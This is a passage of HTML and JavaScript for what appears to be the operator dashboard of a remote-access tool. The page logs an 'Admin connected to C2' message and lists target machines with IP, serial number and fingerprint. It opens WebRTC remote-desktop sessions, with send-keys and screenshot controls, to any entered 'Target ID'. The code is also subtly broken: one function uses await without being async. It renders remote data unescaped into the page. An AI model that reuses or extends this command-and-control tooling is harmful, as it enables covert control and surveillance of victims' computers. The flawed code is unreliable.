 <span class="title">Currently Online</span>
 <span class="value online" id="onlineUsers">0</span>
 </div>
 <div class="stat-card">
 <span class="title">Offline</span>
 <span class="value" id="offlineUsers">0</span>
 </div>
 <div class="stat-card">
 <span class="title">Active Sessions</span>
 <span class="value accent" id="activeSessions">0</span>
 </div>
 </div>

 <!-- Data Table -->
 <div class="data-panel">
 <div class="panel-header">
 <span>Computer Directory</span>
 <i class="fa-solid fa-filter" style="cursor: pointer; color: var(--text-muted);"></i>
 </div>

 <div class="table-header">
 <div></div>
 <div>Computer Name</div>
 <div>Fingerprint</div>
 <div>OS / User</div>
 <div>Last Seen</div>
 <div>Status</div>
 </div>

 <div id="table-body">
 <!-- Rows will be populated by JS -->
 </div>
 </div>
 </div>
 </main>

 <!-- REMOTE SESSION MODAL -->
 <div class="modal-overlay" id="sessionModal" onclick="closeSession(event)">
 <div class="session-container" onclick="event.stopPropagation()">

 <!-- Modal Toolbar -->
 <div class="session-toolbar">
 <div class="session-title">
 <div class="dot"></div>
 <span id="modalMachineName">Connecting...</span>
 </div>
 <div class="session-actions">
 <button class="tool-btn" title="Full Screen"><i class="fa-solid fa-expand"></i></button>
 <button class="tool-btn" title="Send Keys"><i class="fa-solid fa-keyboard"></i></button>
 <button class="tool-btn" title="Screenshot"><i class="fa-solid fa-camera"></i></button>
 <button class="tool-btn end-session" onclick="closeSession(event)">
 <i class="fa-solid fa-power-off"></i> End Session
 </button>
 </div>
 </div>

 <!-- Modal Video Screen -->
 <div class="video-screen">
 <!-- Connecting State -->
 <div class="connecting-state" id="connectingState">
 <i class="fa-solid fa-circle-notch"></i>
 <h2>Establishing Secure Connection</h2>
 <p>Handshaking with remote machine...</p>
 </div>

 <!-- Actual Remote Desktop Video -->
 <video id="remoteVideo" autoplay playsinline style="width: 100%; height: 100%; object-fit: contain;"></video>
 </div>

 </div>
 </div>

 <!-- Interactive JavaScript -->
 <script>
 const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
 const host = window.location.host;
 const wsUrl = protocol + '//' + host + '/';

 const ws = new WebSocket(wsUrl);
 let users = {};
 let sessions = {};
 const remoteVideo = document.getElementById('remoteVideo');

 ws.onopen = () => {
 console.log("Admin connected to C2");
 ws.send(JSON.stringify({ type: 'register_admin' }));
 };

 ws.onmessage = (event) => {
 try {
 const data = JSON.parse(event.data);

 if (data.type === 'registered') {
 ws.isAdmin = true;
 }
 else if (data.type === 'init_users') {
 users = {};
 data.users.forEach(user => {
 users[user.id] = {
 status: user.status === 'Online' ? 'Online' : 'Offline',
 info: { os: user.os, user: user.user },
 lastSeen: user.last_seen * 1000,
 sessionActive: false,
 serialNumber: user.serial_number,
 ip: user.ip,
 fingerprint: user.fingerprint
 };
 });
 renderUsers();
 }
 else if (data.type === 'user_update') {
 if (!users[data.id]) {
 users[data.id] = {
 status: 'Online',
 info: data.info,
 lastSeen: data.lastSeen,
 sessionActive: false,
 serialNumber: data.info.serialNumber || 'N/A',
 ip: data.info.ip || 'Unknown',
 fingerprint: data.info.fingerprint || 'N/A'
 };
 } else {
 users[data.id].status = 'Online';
 users[data.id].info = data.info;
 users[data.id].lastSeen = data.lastSeen;
 users[data.id].sessionActive = false;
 }
 renderUsers();
 }
 else if (data.type === 'heartbeat') {
 if (users[data.id]) {
 users[data.id].lastSeen = Date.now();
 users[data.id].status = 'Online';
 renderUsers();
 }
 }
 else if (data.type === 'offer') {
 handleWebRTCOffer(data.sdp, data.targetId);
 }
 else if (data.type === 'candidate') {
 handleWebRTCCandidate(data.candidate, data.targetId);
 }
 else if (data.type === 'session_active') {
 if (users[data.agentId]) {
 users[data.agentId].sessionActive = true;
 users[data.agentId].status = 'Online';
 renderUsers();
 }
 }
 else if (data.type === 'refresh_users') {
 // Refresh logic handled by real-time updates
 }
 } catch (e) {
 console.error("Error parsing message:", e);
 }
 };

 function getSession(targetId) {
 if (!sessions[targetId]) {
 sessions[targetId] = {
 pc: new RTCPeerConnection({
 iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
 }),
 candidates: []
 };

 const pc = sessions[targetId].pc;

 pc.ontrack = (event) => {
 remoteVideo.srcObject = event.streams[0];
 document.getElementById('connectingState').style.display = 'none';
 };

 pc.onicecandidate = (event) => {
 if (event.candidate) {
 ws.send(JSON.stringify({
 type: 'candidate',
 targetId: targetId,
 candidate: event.candidate
 }));
 }
 };

 pc.oniceconnectionstatechange = () => {
 const state = pc.iceConnectionState;
 if (state === 'disconnected' || state === 'failed') {
 closeSession(null, true);
 }
 };
 }
 return sessions[targetId];
 }

 async function handleWebRTCOffer(offerSDP, targetId) {
 const session = getSession(targetId);
 const pc = session.pc;

 try {
 await pc.setRemoteDescription(new RTCSessionDescription(offerSDP));

 while (session.candidates.length > 0) {
 const candidate = session.candidates.shift();
 await pc.addIceCandidate(new RTCIceCandidate(candidate));
 }

 const answer = await pc.createAnswer();
 await pc.setLocalDescription(answer);

 ws.send(JSON.stringify({
 type: 'answer',
 targetId: targetId,
 sdp: pc.localDescription
 }));
 } catch (err) {
 console.error("[WEBRTC] Error handling offer:", err);
 }
 }

 function handleWebRTCCandidate(candidate, targetId) {
 const session = getSession(targetId);

 if (session.pc.remoteDescription) {
 session.pc.addIceCandidate(new RTCIceCandidate(candidate))
 .catch(err => console.error("[WEBRTC] Error adding candidate:", err));
 } else {
 session.candidates.push(candidate);
 }
 }

 async function openNewSession() {
 const targetId = prompt("Enter Target ID:");
 if (!targetId) return;

 const session = getSession(targetId);
 const pc = session.pc;

 const offer = await pc.createOffer();
 await pc.setLocalDescription(offer);

 ws.send(JSON.stringify({
 type: 'offer',
 targetId: targetId,
 sdp: pc.localDescription
 }));

 document.getElementById('sessionModal').classList.add('active');
 document.getElementById('modalMachineName').textContent = "Connecting to " + targetId + "...";
 }

 function closeSession(event, force = false) {
 if (event) {
 event.stopPropagation();
 }
 document.getElementById('sessionModal').classList.remove('active');
 
 // Reset video
 remoteVideo.srcObject = null;
 document.getElementById('connectingState').style.display = 'block';
 }

 function renderUsers() {
 const tableBody = document.getElementById('table-body');
 tableBody.innerHTML = '';
 
 let onlineCount = 0;
 let offlineCount = 0;
 let totalUsers = Object.keys(users).length;

 Object.values(users).forEach(user => {
 if (user.status === 'Online') onlineCount++;
 else offlineCount++;

 const row = document.createElement('div');
 row.className = 'table-row';
 row.onclick = () => {
 // Open session for this user
 const targetId = Object.keys(users).find(key => users[key] === user);
 if (targetId) {
 openNewSessionForId(targetId);
 }
 };

 row.innerHTML = `
 <div class="custom-checkbox"></div>
 <div class="machine-info">
 <div class="name">
 <i class="fa-solid fa-desktop"></i>
 <span>${user.info.user || user.id}</span>
 </div>
 <div class="company">${user.info.os || 'Unknown OS'}</div>
 </div>
 <div>${user.fingerprint || 'N/A'}</div>
 <div>${user.info.os || 'N/A'} / ${user.info.user || 'N/A'}</div>
 <div>${new Date(user.lastSeen).toLocaleTimeString()}</div>
 <div class="status">
 <div class="status-dot ${user.status === 'Online' ? 'online' : 'offline'}"></div>
 <span>${user.status}</span>
 </div>
 `;

 tableBody.appendChild(row);
 });

 document.getElementById('totalUsers').textContent = totalUsers;
 document.getElementById('onlineUsers').textContent = onlineCount;
 document.getElementById('offlineUsers').textContent = offlineCount;
 document.getElementById('activeSessions').textContent = Object.values(users).filter(u => u.sessionActive).length;
 }

 function openNewSessionForId(targetId) {
 const session = getSession(targetId);
 const pc = session.pc;

 const offer = await pc.createOffer();
 await pc.setLocalDescription(offer);

 ws.send(JSON.stringify({
 type: 'offer',
 targetId: targetId,
 sdp: pc.localDescription
 }));

 document.getElementById('sessionModal').classList.add('active');
 document.getElementById('modalMachineName').textContent = "Connecting to " + targetId + "...";
 }

 function filterTable() {
 const input = document.getElementById('searchInput');
 const filter = input.value.toLowerCase();
 const rows = document.getElementsByClassName('table-row');

 for (let i = 0; i < rows.length; i++) {
 const name = rows[i].getElementsByClassName('machine-info')[0].innerText.toLowerCase();
 if (name.includes(filter)) {
 rows[i].style.display = '';
 } else {
 rows[i].style.display = 'none';
 }
 }
 }
 </script>
</body>
</html>
`;
